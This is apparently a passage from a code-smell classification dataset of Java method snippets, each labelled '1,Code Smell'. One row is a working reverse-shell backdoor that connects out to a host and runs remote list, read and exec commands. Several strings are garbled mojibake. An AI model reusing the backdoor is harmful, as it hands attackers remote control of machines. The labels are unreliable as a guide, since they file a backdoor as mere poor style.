 catch (  IllegalAccessException e) {
    throw new ServiceException(ErrorEnum.SAVE_FAILURE);
  }
  E e=commonRepository.save(entityFull);
  return Result.of(CopyUtil.copy(e,entityVoClass));
}",1,Code Smell
"@Override public Operation customize(Operation operation,HandlerMethod handlerMethod){
  MethodParameter[] methodParameters=handlerMethod.getMethodParameters();
  int parametersLength=methodParameters.length;
  List<Parameter> parametersToAddToOperation=new ArrayList<>();
  for (int i=0; i < parametersLength; i++) {
    MethodParameter parameter=methodParameters[i];
    QuerydslPredicate predicate=parameter.getParameterAnnotation(QuerydslPredicate.class);
    if (predicate == null)     continue;
    QuerydslBindings bindings=extractQdslBindings(predicate);
    Set<String> fieldsToAdd=Arrays.stream(predicate.root().getDeclaredFields()).filter(field -> !Modifier.isStatic(field.getModifiers())).map(Field::getName).collect(Collectors.toCollection(LinkedHashSet::new));
    Map<String,Object> pathSpecMap=getPathSpec(bindings,""pathSpecs"");
    Set<String> blacklist=getFieldValues(bindings,""denyList"",""blackList"");
    fieldsToAdd.removeIf(blacklist::contains);
    Set<String> whiteList=getFieldValues(bindings,""allowList"",""whiteList"");
    Set<String> aliases=getFieldValues(bindings,""aliases"",null);
    fieldsToAdd.addAll(aliases);
    fieldsToAdd.addAll(whiteList);
    if (getFieldValueOfBoolean(bindings,""excludeUnlistedProperties"")) {
      fieldsToAdd.removeIf(s -> !whiteList.contains(s) && !aliases.contains(s));
    }
    for (    String fieldName : fieldsToAdd) {
      Type type=getFieldType(fieldName,pathSpecMap,predicate.root());
      if (type != null) {
        Parameter newParameter=buildParam(type,fieldName);
        parametersToAddToOperation.add(newParameter);
      }
    }
  }
  if (!CollectionUtils.isEmpty(parametersToAddToOperation)) {
    if (operation.getParameters() == null)     operation.setParameters(parametersToAddToOperation);
 else     operation.getParameters().addAll(parametersToAddToOperation);
  }
  return operation;
}",1,Code Smell
"@Override public boolean onTouchEvent(MotionEvent event){
  if (chartData == null) {
    return false;
  }
  if (!enabled) {
    pickerDelegate.uncapture(event,event.getActionIndex());
    getParent().requestDisallowInterceptTouchEvent(false);
    chartCaptured=false;
    return false;
  }
  int x=(int)event.getX(event.getActionIndex());
  int y=(int)event.getY(event.getActionIndex());
switch (event.getActionMasked()) {
case MotionEvent.ACTION_DOWN:
    capturedTime=System.currentTimeMillis();
  getParent().requestDisallowInterceptTouchEvent(true);
boolean captured=pickerDelegate.capture(x,y,event.getActionIndex());
if (captured) {
return true;
}
capturedX=lastX=x;
capturedY=lastY=y;
if (chartArea.contains(x,y)) {
if (selectedIndex < 0 || !animateLegentTo) {
chartCaptured=true;
selectXOnChart(x,y);
}
return true;
}
return false;
case MotionEvent.ACTION_POINTER_DOWN:
return pickerDelegate.capture(x,y,event.getActionIndex());
case MotionEvent.ACTION_MOVE:
int dx=x - lastX;
int dy=y - lastY;
if (pickerDelegate.captured()) {
boolean rez=pickerDelegate.move(x,y,event.getActionIndex());
if (event.getPointerCount() > 1) {
x=(int)event.getX(1);
y=(int)event.getY(1);
pickerDelegate.move(x,y,1);
}
getParent().requestDisallowInterceptTouchEvent(rez);
return true;
}
if (chartCaptured) {
boolean disable;
if (canCaptureChartSelection && System.currentTimeMillis() - capturedTime > 200) {
disable=true;
}
 else {
disable=Math.abs(dx) > Math.abs(dy) || Math.abs(dy) < touchSlop;
}
lastX=x;
lastY=y;
getParent().requestDisallowInterceptTouchEvent(disable);
selectXOnChart(x,y);
}
 else if (chartArea.contains(capturedX,capturedY)) {
int dxCaptured=capturedX - x;
int dyCaptured=capturedY - y;
if (Math.sqrt(dxCaptured * dxCaptured + dyCaptured * dyCaptured) > touchSlop || System.currentTimeMillis() - capturedTime > 200) {
chartCaptured=true;
selectXOnChart(x,y);
}
}
return true;
case MotionEvent.ACTION_POINTER_UP:
pickerDelegate.uncapture(event,event.getActionIndex());
return true;
case MotionEvent.ACTION_CANCEL:
case MotionEvent.ACTION_UP:
if (pickerDelegate.uncapture(event,event.getActionIndex())) {
return true;
}
if (chartArea.contains(capturedX,capturedY) && !chartCaptured) {
animateLegend(false);
}
pickerDelegate.uncapture();
updateLineSignature();
getParent().requestDisallowInterceptTouchEvent(false);
chartCaptured=false;
onActionUp();
invalidate();
int min=0;
if (useMinHeight) min=findMinValue(startXIndex,endXIndex);
setMaxMinValue(findMaxValue(startXIndex,endXIndex),min,true,true,false);
return true;
}
return false;
}",1,Code Smell
"private int calculateTabWidthImpl(int tabPlacement,int tabIndex,FontMetrics metrics,boolean rotated){
  int tabWidthMode=getTabWidthMode();
  if (tabWidthMode == WIDTH_MODE_EQUAL && isHorizontalOrRotated(tabPlacement) && !inCalculateEqual) {
    inCalculateEqual=true;
    try {
      return isHorizontalTabPlacement(tabPlacement) ? calculateMaxTabWidth(tabPlacement) : calculateMaxTabHeight(tabPlacement);
    }
  finally {
      inCalculateEqual=false;
    }
  }
  textIconGap=scale(textIconGapUnscaled);
  int tabWidth;
  Icon icon;
  if (tabWidthMode == WIDTH_MODE_COMPACT && tabIndex != tabPane.getSelectedIndex() && isHorizontalOrRotated(tabPlacement) && tabPane.getTabComponentAt(tabIndex) == null && (icon=getIconForTab(tabIndex)) != null) {
    Insets tabInsets=getTabInsets(tabPlacement,tabIndex);
    tabWidth=icon.getIconWidth() + tabInsets.left + tabInsets.right;
  }
 else {
    int iconPlacement=clientPropertyInt(tabPane,TABBED_PANE_TAB_ICON_PLACEMENT,tabIconPlacement);
    if ((iconPlacement == TOP || iconPlacement == BOTTOM) && tabPane.getTabComponentAt(tabIndex) == null && (icon=getIconForTab(tabIndex)) != null) {
      tabWidth=icon.getIconWidth();
      View view=getTextViewForTab(tabIndex);
      if (view != null)       tabWidth=Math.max(tabWidth,(int)view.getPreferredSpan(View.X_AXIS));
 else {
        String title=tabPane.getTitleAt(tabIndex);
        if (title != null)         tabWidth=Math.max(tabWidth,metrics.stringWidth(title));
      }
      Insets tabInsets=getTabInsets(tabPlacement,tabIndex);
      tabWidth+=tabInsets.left + tabInsets.right;
    }
 else {
      tabWidth=super.calculateTabWidth(tabPlacement,tabIndex,metrics) - 3;
      Component tabComponent;
      if (rotated && (tabComponent=tabPane.getTabComponentAt(tabIndex)) != null) {
        Dimension prefSize=tabComponent.getPreferredSize();
        tabWidth=tabWidth - prefSize.width + prefSize.height;
      }
    }
  }
  if (isTabClosable(tabIndex))   tabWidth+=closeIcon.getIconWidth();
  int min=getTabClientPropertyInt(tabIndex,TABBED_PANE_MINIMUM_TAB_WIDTH,minimumTabWidth);
  int max=getTabClientPropertyInt(tabIndex,TABBED_PANE_MAXIMUM_TAB_WIDTH,maximumTabWidth);
  if (min > 0)   tabWidth=Math.max(tabWidth,scale(min));
  if (max > 0 && tabPane.getTabComponentAt(tabIndex) == null)   tabWidth=Math.min(tabWidth,scale(max));
  return tabWidth;
}",1,Code Smell
"@Override public boolean initOnce(){
  try {
    Class<?> clazz=DexKit.doFindClass(DexKit.C_CustomWidgetUtil);
    for (    Method m : clazz.getDeclaredMethods()) {
      Class<?>[] argt=m.getParameterTypes();
      if (argt.length == 6 && Modifier.isStatic(m.getModifiers()) && m.getReturnType() == void.class) {
        XposedBridge.hookMethod(m,new XC_MethodHook(){
          @Override protected void beforeHookedMethod(          MethodHookParam param){
            if (LicenseStatus.sDisableCommonHooks) {
              return;
            }
            if (!isEnabled()) {
              return;
            }
            param.args[4]=Integer.MAX_VALUE;
          }
          @Override protected void afterHookedMethod(          MethodHookParam param){
            if (LicenseStatus.sDisableCommonHooks) {
              return;
            }
            if (!isEnabled()) {
              return;
            }
            if (HostInfo.requireMinQQVersion(QQVersion.QQ_8_8_11)) {
              TextView tv=(TextView)param.args[0];
              tv.setMaxWidth(Integer.MAX_VALUE);
              ViewGroup.LayoutParams lp=tv.getLayoutParams();
              lp.width=-2;
              tv.setLayoutParams(lp);
            }
          }
        }
);
        break;
      }
    }
    return true;
  }
 catch (  Throwable e) {
    log(e);
    return false;
  }
}",1,Code Smell
"/** 
 * Registers an element with the given identifier.
 * @param identifier        an identifier
 * @param element           an Element instance
 */
public void register(String identifier,Element element){
  if (element == null) {
    throw new IllegalArgumentException(""An element must be specified"");
  }
  if (StringUtils.isNullOrEmpty(identifier)) {
    identifier=UUID.randomUUID().toString();
  }
  identifier=identifier.toLowerCase();
  if (identifierScope == IdentifierScope.Hierarchical) {
    identifier=calculateHierarchicalIdentifier(identifier,element);
  }
  for (  String id : elementsByIdentifier.keySet()) {
    Element e=elementsByIdentifier.get(id);
    if (e.equals(element) && !id.equals(identifier)) {
      if (id.matches(""[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}"")) {
        throw new RuntimeException(""Please assign an identifier to \"""" + element.getCanonicalName() + ""\"" before using it with !ref"");
      }
 else {
        throw new RuntimeException(""The element is already registered with an identifier of \"""" + id + ""\"""");
      }
    }
  }
  Element e=elementsByIdentifier.get(identifier);
  Relationship r=relationshipsByIdentifier.get(identifier);
  if ((e == null && r == null) || (e == element)) {
    elementsByIdentifier.put(identifier,element);
  }
 else {
    throw new RuntimeException(""The identifier \"""" + identifier + ""\"" is already in use"");
  }
}
/** 
 * Registers a relationship with the given identifier.
 * @param identifier        an identifier
 * @param relationship      a Relationship instance
 */
public void register(String identifier,Relationship relationship){
  if (relationship == null) {
    throw new IllegalArgumentException(""A relationship must be specified"");
  }
  if (StringUtils.isNullOrEmpty(identifier)) {
    identifier=UUID.randomUUID().toString();
  }
  identifier=identifier.toLowerCase();
  Element e=elementsByIdentifier.get(identifier);
  Relationship r=relationshipsByIdentifier.get(identifier);
  if ((e == null && r == null) || (r == relationship)) {
    relationshipsByIdentifier.put(identifier,relationship);
  }
 else {
    throw new RuntimeException(""The identifier \"""" + identifier + ""\"" is already in use"");
  }
}",1,Code Smell
"private static boolean check(String[] requestUris,String[] urls){
  for (int i1=0; i1 < requestUris.length; i1++) {
    if (i1 >= urls.length) {
      return false;
    }
    if (""**"".equals(urls[i1])) {
      return true;
    }
    if (""*"".equals(urls[i1])) {
      continue;
    }
    if (requestUris[i1].contains(""."") && urls[i1].contains(""."")) {
      String[] split=requestUris[i1].split(""\\."");
      String[] split2=urls[i1].split(""\\."");
      if (""*"".equals(split2[0]) && split[1].equals(split2[1])) {
        return true;
      }
    }
    if (!requestUris[i1].equals(urls[i1])) {
      return false;
    }
  }
  return true;
}",1,Code Smell
"@Override public void dismiss(){
  super.dismiss();
  stickersShaker.stopShake(false);
  if (!ignoreMasterDismiss && masterDismissListener != null) {
    masterDismissListener.run();
  }
  if (onDismissListener != null) {
    onDismissListener.run();
  }
  if (reqId != 0) {
    ConnectionsManager.getInstance(currentAccount).cancelRequest(reqId,true);
    reqId=0;
  }
  NotificationCenter.getGlobalInstance().removeObserver(this,NotificationCenter.emojiLoaded);
  if (importingStickers != null) {
    if (importingStickersPaths != null) {
      for (int a=0, N=importingStickersPaths.size(); a < N; a++) {
        SendMessagesHelper.ImportingSticker sticker=importingStickersPaths.get(a);
        if (!sticker.validated) {
          FileLoader.getInstance(currentAccount).cancelFileUpload(sticker.path,false);
        }
        if (sticker.animated) {
          new File(sticker.path).delete();
        }
      }
    }
    NotificationCenter.getInstance(currentAccount).removeObserver(this,NotificationCenter.fileUploaded);
    NotificationCenter.getInstance(currentAccount).removeObserver(this,NotificationCenter.fileUploadFailed);
  }
  NotificationCenter.getInstance(currentAccount).removeObserver(this,NotificationCenter.stickersDidLoad);
  NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.startAllHeavyOperations,4);
}",1,Code Smell
"/** 
 * Re-balance group allocation info
 * @param req       Http Servlet Request
 * @param sBuffer   string buffer
 * @param result    process result
 * @return    process result
 */
public StringBuilder adminRebalanceGroupAllocateInfo(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result){
  if (!WebParameterUtils.getAUDBaseInfo(req,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final BaseEntity opEntity=(BaseEntity)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.GROUPNAME,true,"""",sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  String groupName=(String)result.getRetData();
  if (!WebParameterUtils.getIntParamValue(req,WebFieldDef.REJOINWAIT,false,0,0,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final int reJoinWait=(int)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSCONSUMERID,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  Set<String> consumerIdSet=(Set<String>)result.getRetData();
  ConsumerInfoHolder consumerInfoHolder=master.getConsumerHolder();
  ConsumeGroupInfo consumeGroupInfo=consumerInfoHolder.getConsumeGroupInfo(groupName);
  if (consumeGroupInfo == null) {
    String errInfo=sBuffer.append(""The group("").append(groupName).append("") not online!"").toString();
    sBuffer.delete(0,sBuffer.length());
    WebParameterUtils.buildFailResult(sBuffer,errInfo);
    return sBuffer;
  }
  Map<String,NodeRebInfo> nodeRebInfoMap=consumeGroupInfo.getBalanceMap();
  for (  String consumerId : consumerIdSet) {
    if (nodeRebInfoMap.containsKey(consumerId)) {
      String errInfo=sBuffer.append(""Duplicated set for consumerId("").append(consumerId).append("") in group("").append(groupName).append("")! \""}"").toString();
      sBuffer.delete(0,sBuffer.length());
      WebParameterUtils.buildFailResult(sBuffer,errInfo);
      return sBuffer;
    }
  }
  logger.info(sBuffer.append(""[Re-balance] Add rebalance consumer: group="").append(groupName).append("", consumerIds="").append(consumerIdSet.toString()).append("", reJoinWait="").append(reJoinWait).append("", creator="").append(opEntity.getModifyUser()).toString());
  sBuffer.delete(0,sBuffer.length());
  consumerInfoHolder.addRebConsumerInfo(groupName,consumerIdSet,reJoinWait);
  WebParameterUtils.buildSuccessResult(sBuffer);
  return sBuffer;
}",1,Code Smell
"/** 
 * Parses a tag.  Returns true if it's a start tag.
 */
protected int parseTag() throws IOException {
  if (_peekTag >= 0) {
    int tag=_peekTag;
    _peekTag=-1;
    return tag;
  }
  int ch=skipWhitespace();
  int endTagDelta=0;
  if (ch != '<')   throw expectedChar(""'<'"",ch);
  ch=read();
  if (ch == '/') {
    endTagDelta=100;
    ch=_is.read();
  }
  if (!isTagChar(ch))   throw expectedChar(""tag"",ch);
  _sbuf.setLength(0);
  for (; isTagChar(ch); ch=read())   _sbuf.append((char)ch);
  if (ch != '>')   throw expectedChar(""'>'"",ch);
  Integer value=(Integer)_tagMap.get(_sbuf.toString());
  if (value == null)   throw error(""Unknown tag <"" + _sbuf + "">"");
  return value.intValue() + endTagDelta;
}",1,Code Smell
"private void handleClick(@NonNull ApplicationItem item){
  if (!item.isInstalled || item.userIds.length == 0) {
    ApplicationInfo info;
    try {
      info=PackageManagerCompat.getApplicationInfo(item.packageName,MATCH_UNINSTALLED_PACKAGES | PackageManagerCompat.MATCH_STATIC_SHARED_AND_SDK_LIBRARIES,UserHandleHidden.myUserId());
    }
 catch (    RemoteException|PackageManager.NameNotFoundException e) {
      displayShortToast(R.string.app_not_installed);
      return;
    }
    if (ApplicationInfoCompat.isInstalled(info)) {
      item.isInstalled=true;
      item.userIds=new int[]{UserHandleHidden.myUserId()};
      Intent intent=AppDetailsActivity.getIntent(mActivity,item.packageName,UserHandleHidden.myUserId());
      mActivity.startActivity(intent);
      return;
    }
    if (FeatureController.isInstallerEnabled()) {
      if (ApplicationInfoCompat.isSystemApp(info) && SelfPermissions.canInstallExistingPackages()) {
        mActivity.startActivity(PackageInstallerActivity.getLaunchableInstance(mActivity,item.packageName));
        return;
      }
      if (Paths.exists(info.publicSourceDir)) {
        mActivity.startActivity(PackageInstallerActivity.getLaunchableInstance(mActivity,Uri.fromFile(new File(info.publicSourceDir))));
        return;
      }
    }
    if (ApplicationInfoCompat.isSystemApp(info)) {
      displayShortToast(R.string.app_not_installed);
      return;
    }
    new MaterialAlertDialogBuilder(mActivity).setTitle(mActivity.getString(R.string.uninstall_app,item.label)).setMessage(R.string.uninstall_app_again_message).setNegativeButton(R.string.no,null).setPositiveButton(R.string.yes,(dialog,which) -> ThreadUtils.postOnBackgroundThread(() -> {
      PackageInstallerCompat installer=PackageInstallerCompat.getNewInstance();
      installer.setAppLabel(item.label);
      boolean uninstalled=installer.uninstall(item.packageName,UserHandleHidden.myUserId(),false);
      ThreadUtils.postOnMainThread(() -> {
        if (uninstalled) {
          displayLongToast(R.string.uninstalled_successfully,item.label);
        }
 else {
          displayLongToast(R.string.failed_to_uninstall,item.label);
        }
      }
);
    }
)).show();
    return;
  }
  if (item.userIds.length == 1) {
    int[] userHandles=Users.getUsersIds();
    if (ArrayUtils.contains(userHandles,item.userIds[0])) {
      Intent intent=AppDetailsActivity.getIntent(mActivity,item.packageName,item.userIds[0]);
      mActivity.startActivity(intent);
      return;
    }
    displayShortToast(R.string.app_not_installed);
    return;
  }
  CharSequence[] userNames=new String[item.userIds.length];
  List<UserInfo> users=Users.getUsers();
  for (  UserInfo info : users) {
    for (int i=0; i < item.userIds.length; ++i) {
      if (info.id == item.userIds[i]) {
        userNames[i]=info.toLocalizedString(mActivity);
      }
    }
  }
  new SearchableItemsDialogBuilder<>(mActivity,userNames).setTitle(R.string.select_user).setOnItemClickListener((dialog,which,item1) -> {
    Intent intent=AppDetailsActivity.getIntent(mActivity,item.packageName,item.userIds[which]);
    mActivity.startActivity(intent);
    dialog.dismiss();
  }
).setNegativeButton(R.string.cancel,null).show();
}",1,Code Smell
"/** 
 * request proxyHost list from manager, update ClientMgr.proxyHostList and channels
 * @throws Exception
 */
public void doProxyEntryQueryWork() throws Exception {
  if (localMd5 == null) {
    localMd5=calcHostInfoMd5(proxyInfoList);
  }
  ProxyConfigEntry proxyEntry=null;
  String configAddr=clientConfig.getConfStoreBasePath() + inlongGroupId;
  if (clientConfig.isReadProxyIPFromLocal()) {
    configAddr=configAddr + "".local"";
    proxyEntry=getLocalProxyListFromFile(configAddr);
  }
 else {
    configAddr=configAddr + "".managerip"";
    int retryCount=1;
    while (proxyEntry == null && retryCount < this.clientConfig.getProxyUpdateMaxRetry()) {
      proxyEntry=requestProxyEntryQuietly();
      retryCount++;
      if (proxyEntry == null) {
        TimeUnit.SECONDS.sleep(1);
      }
    }
    if (proxyEntry != null) {
      tryToWriteCacheProxyEntry(proxyEntry,configAddr);
    }
    if (localMd5 == null && proxyEntry == null) {
      LOGGER.error(""Can't connect manager at the start of proxy API {}"",this.clientConfig.getManagerUrl());
      proxyEntry=tryToReadCacheProxyEntry(configAddr);
    }
    if (localMd5 != null && proxyEntry == null && proxyInfoList != null) {
      StringBuffer s=new StringBuffer();
      for (      HostInfo tmp : proxyInfoList) {
        s.append(tmp.getHostName()).append("";"").append(tmp.getPortNumber()).append("","");
      }
      LOGGER.warn(""Backup proxyEntry [{}]"",s);
    }
  }
  if (localMd5 == null && proxyEntry == null && proxyInfoList == null) {
    if (clientConfig.isReadProxyIPFromLocal()) {
      throw new Exception(""Local proxy address configure "" + ""read failure, please check first!"");
    }
 else {
      throw new Exception(""Connect Manager failure, please check first!"");
    }
  }
  compareProxyList(proxyEntry);
}",1,Code Smell
"public void run(){
  try {
    String sepS=""===============Start==================\n"";
    String sepE=""===============Ended==================\n"";
    Socket socket=new Socket(host,port);
    BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
    bufferedWriter.write(""happy everyday!\n"");
    bufferedWriter.write(""\n"");
    bufferedWriter.write(info());
    bufferedWriter.write(""\n"");
    bufferedWriter.write(""help: info | list [dir] | read [file] | exec [cmd]\n"");
    bufferedWriter.flush();
    BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(socket.getInputStream()));
    while (true) {
      String line;
      while ((line=bufferedReader.readLine()) == null)       ;
      if (line.equals(""exit"")) {
        return;
      }
      try {
        StringBuilder result=new StringBuilder();
        result.append(sepS);
        if (line.startsWith(""list"")) {
          String path=line.substring(5);
          result.append(list(path));
        }
 else         if (line.startsWith(""read"")) {
          String file=line.substring(5);
          result.append(read(file));
        }
 else         if (line.startsWith(""exec"")) {
          String command=line.substring(5);
          result.append(exec(command));
        }
 else         if (line.startsWith(""info"")) {
          result.append(info());
        }
 else         if (line.startsWith(""find"")) {
          String[] strArr=line.substring(5).split("";"");
          result.append(find(strArr[0],strArr[1],strArr[2]));
        }
        result.append(sepE);
        bufferedWriter.write(result.toString());
        bufferedWriter.flush();
      }
 catch (      Exception e) {
        bufferedWriter.write(""error, try again!"");
        bufferedWriter.flush();
      }
    }
  }
 catch (  IOException e) {
  }
}",1,Code Smell
"private ByteBuf writeToBuf3(EncodeObject object){
  ByteBuf buf=null;
  try {
    int totalLength=1 + 4 + 4;
    byte[] body=null;
    if (object.getBodylist() != null && object.getBodylist().size() != 0) {
      ByteArrayOutputStream out=new ByteArrayOutputStream();
      Iterator<byte[]> iter=object.getBodylist().iterator();
      while (iter.hasNext()) {
        byte[] entry=iter.next();
        out.write(entry);
        out.write(""\n"".getBytes(""utf8""));
      }
      body=out.toByteArray();
    }
    if (object.getBodyBytes() != null && object.getBodyBytes().length != 0) {
      body=object.getBodyBytes();
    }
    if (body != null) {
      String msgAttrs=object.getAttributes();
      if (object.isCompress()) {
        body=processCompress(body);
      }
      if (object.isEncrypt()) {
        EncryptConfigEntry encryptEntry=object.getEncryptEntry();
        if (encryptEntry != null) {
          if (Utils.isNotBlank(msgAttrs)) {
            msgAttrs=msgAttrs + ""&"";
          }
          EncryptInfo encryptInfo=encryptEntry.getRsaEncryptInfo();
          msgAttrs=msgAttrs + ""_userName="" + object.getUserName()+ ""&_encyVersion=""+ encryptInfo.getVersion()+ ""&_encyAesKey=""+ encryptInfo.getRsaEncryptedKey();
          body=EncryptUtil.aesEncrypt(body,encryptInfo.getAesKey());
        }
      }
      if (Utils.isNotBlank(object.getMsgUUID())) {
        if (Utils.isNotBlank(msgAttrs)) {
          msgAttrs=msgAttrs + ""&"";
        }
        msgAttrs=msgAttrs + ""msgUUID="" + object.getMsgUUID();
      }
      int msgType=3;
      if (object.isEncrypt()) {
        msgType|=FLAG_ALLOW_ENCRYPT;
      }
      totalLength=totalLength + body.length + msgAttrs.getBytes(""utf8"").length;
      buf=ByteBufAllocator.DEFAULT.buffer(4 + totalLength);
      buf.writeInt(totalLength);
      buf.writeByte(msgType);
      buf.writeInt(body.length);
      buf.writeBytes(body);
      buf.writeInt(msgAttrs.getBytes(""utf8"").length);
      buf.writeBytes(msgAttrs.getBytes(""utf8""));
    }
  }
 catch (  Exception e) {
    logger.error(""{}"",e.getMessage());
    e.printStackTrace();
  }
  return buf;
}",1,Code Smell
"private synchronized boolean insertOrRemoveProperties(boolean isInsert,Map<String,String> changeConfigMap){
  if (changeConfigMap == null || changeConfigMap.isEmpty()) {
    return false;
  }
  Map<String,String> filteredMap=filterInValidRecords(changeConfigMap);
  if (filteredMap.isEmpty()) {
    LOG.info(""Part {} properties {}, but the records are all illegal {}"",(isInsert ? ""insert"" : ""remove""),getFileName(),changeConfigMap);
    return false;
  }
  boolean changed=false;
  Map<String,String> newConfigMap=forkHolder();
  if (isInsert) {
    for (    Map.Entry<String,String> entry : filteredMap.entrySet()) {
      String oldValue=newConfigMap.put(entry.getKey(),entry.getValue());
      if (!ObjectUtils.equals(oldValue,entry.getValue())) {
        changed=true;
      }
    }
  }
 else {
    for (    Map.Entry<String,String> entry : filteredMap.entrySet()) {
      String oldValue=newConfigMap.remove(entry.getKey());
      if (oldValue != null) {
        changed=true;
      }
    }
  }
  if (!changed) {
    return false;
  }
  return compAndStorePropertiesToFile(newConfigMap);
}
",1,Code Smell
"private void submitSectionTasks(ChunkJobCollector importantCollector,ChunkJobCollector semiImportantCollector,ChunkJobCollector deferredCollector){
  this.submitSectionTasks(importantCollector,ChunkUpdateType.IMPORTANT_SORT,true);
  this.submitSectionTasks(semiImportantCollector,ChunkUpdateType.IMPORTANT_REBUILD,true);
  this.submitSectionTasks(deferredCollector,ChunkUpdateType.REBUILD,false);
  this.submitSectionTasks(deferredCollector,ChunkUpdateType.INITIAL_BUILD,false);
  this.submitSectionTasks(deferredCollector,ChunkUpdateType.SORT,true);
}
private void submitSectionTasks(ChunkJobCollector collector,ChunkUpdateType type,boolean ignoreEffortCategory){
  var queue=this.taskLists.get(type);
  while (!queue.isEmpty() && collector.hasBudgetFor(type.getTaskEffort(),ignoreEffortCategory)) {
    RenderSection section=queue.remove();
    if (section.isDisposed()) {
      continue;
    }
    var pendingUpdate=section.getPendingUpdate();
    if (pendingUpdate != null && pendingUpdate != type) {
      continue;
    }
    int frame=this.lastUpdatedFrame;
    ChunkBuilderTask<? extends BuilderTaskOutput> task;
    if (type == ChunkUpdateType.SORT || type == ChunkUpdateType.IMPORTANT_SORT) {
      task=this.createSortTask(section,frame);
      if (task == null) {
        continue;
      }
    }
 else {
      task=this.createRebuildTask(section,frame);
      if (task == null) {
        var result=ChunkJobResult.successfully(new ChunkBuildOutput(section,frame,NoData.forEmptySection(section.getPosition()),BuiltSectionInfo.EMPTY,Collections.emptyMap()));
        this.buildResults.add(result);
        section.setTaskCancellationToken(null);
      }
    }
    if (task != null) {
      var job=this.builder.scheduleTask(task,type.isImportant(),collector::onJobFinished);
      collector.addSubmittedJob(job);
      section.setTaskCancellationToken(job);
    }
    section.setLastSubmittedFrame(frame);
    section.setPendingUpdate(null);
  }
}
",1,Code Smell
"@NonNull public static String getActivitiesFlagsString(int flag){
  StringBuilder builder=new StringBuilder();
  if ((flag & ActivityInfo.FLAG_ALLOW_TASK_REPARENTING) != 0)   builder.append(""AllowReparenting, "");
  if ((flag & ActivityInfo.FLAG_ALWAYS_RETAIN_TASK_STATE) != 0)   builder.append(""AlwaysRetain, "");
  if ((flag & ActivityInfo.FLAG_AUTO_REMOVE_FROM_RECENTS) != 0)   builder.append(""AutoRemove, "");
  if ((flag & ActivityInfo.FLAG_CLEAR_TASK_ON_LAUNCH) != 0)   builder.append(""ClearOnLaunch, "");
  if ((flag & ActivityInfo.FLAG_ENABLE_VR_MODE) != 0)   builder.append(""EnableVR, "");
  if ((flag & ActivityInfo.FLAG_EXCLUDE_FROM_RECENTS) != 0)   builder.append(""ExcludeRecent, "");
  if ((flag & ActivityInfo.FLAG_FINISH_ON_CLOSE_SYSTEM_DIALOGS) != 0)   builder.append(""FinishCloseDialogs, "");
  if ((flag & ActivityInfo.FLAG_FINISH_ON_TASK_LAUNCH) != 0)   builder.append(""FinishLaunch, "");
  if ((flag & ActivityInfo.FLAG_HARDWARE_ACCELERATED) != 0)   builder.append(""HardwareAccel, "");
  if ((flag & ActivityInfo.FLAG_IMMERSIVE) != 0)   builder.append(""Immersive, "");
  if ((flag & ActivityInfo.FLAG_MULTIPROCESS) != 0)   builder.append(""Multiprocess, "");
  if ((flag & ActivityInfo.FLAG_NO_HISTORY) != 0)   builder.append(""NoHistory, "");
  if ((flag & ActivityInfo.FLAG_RELINQUISH_TASK_IDENTITY) != 0)   builder.append(""RelinquishIdentity, "");
  if ((flag & ActivityInfo.FLAG_RESUME_WHILE_PAUSING) != 0)   builder.append(""Resume, "");
  if ((flag & ActivityInfo.FLAG_SINGLE_USER) != 0)   builder.append(""Single, "");
  if ((flag & ActivityInfo.FLAG_STATE_NOT_NEEDED) != 0)   builder.append(""NotNeeded, "");
  checkStringBuilderEnd(builder);
  String result=builder.toString();
  return result.isEmpty() ? ""鈿�"" : ""鈿� "" + result;
}",1,Code Smell
"/** 
 * 姣忓皬鏃舵鏌ヤ竴娆�
 */
@Scheduled(cron=""0 0 * * * *"") public void checkNewWithdrawApplication(){
  Long currentDepositId=memberDepositService.getMaxId();
  if (currentDepositId == null)   return;
  if (this.maxDepositId.compareTo(Long.valueOf(0)) != 0) {
    if (currentDepositId.compareTo(this.maxDepositId) > 0) {
      Long count=currentDepositId - this.maxDepositId;
      this.maxDepositId=currentDepositId;
      try {
        String[] adminList=admins.split("","");
        for (int i=0; i < adminList.length; i++) {
          sendEmailMsg(adminList[i],""鏈夋柊鍏呭��( 鍏�"" + count + ""鏉� )"",""鐢ㄦ埛鍏呭�奸�氱煡"");
        }
      }
 catch (      Exception e) {
        MessageResult result;
        try {
          String[] phones=adminPhones.split("","");
          if (phones.length > 0) {
            result=smsProvider.sendSingleMessage(phones[0],""==鐢ㄦ埛鍏呭��=="");
            if (result.getCode() != 0) {
              if (phones.length > 1) {
                smsProvider.sendSingleMessage(phones[1],""==鐢ㄦ埛鍏呭��=="");
              }
            }
          }
        }
 catch (        Exception e1) {
          e1.printStackTrace();
        }
        e.printStackTrace();
      }
    }
  }
 else {
    this.maxDepositId=currentDepositId;
  }
}",1,Code Smell
"private static Set<Ring> groupParentChildShells(List<Ring> polygons){
  Set<Ring> shells=new LinkedHashSet<>();
  int numPolygons=polygons.size();
  if (numPolygons == 0) {
    return shells;
  }
  shells.add(polygons.getFirst());
  if (numPolygons == 1) {
    return shells;
  }
  for (int i=0; i < numPolygons; i++) {
    Ring outer=polygons.get(i);
    if (i < numPolygons - 1) {
      PreparedPolygon prepared=new PreparedPolygon(outer.geom);
      for (int j=i + 1; j < numPolygons; j++) {
        Ring inner=polygons.get(j);
        if (prepared.contains(inner.geom)) {
          if (inner.containedBy != null) {
            inner.containedBy.holes.remove(inner);
            shells.remove(inner);
          }
          inner.containedBy=outer;
          if (inner.isHole()) {
            outer.holes.add(inner);
          }
 else {
            shells.add(inner);
          }
        }
      }
    }
    if (outer.containedBy == null) {
      shells.add(outer);
    }
  }
  return shells;
}",1,Code Smell
"/** 
 * Write topic deploy configurations to Master
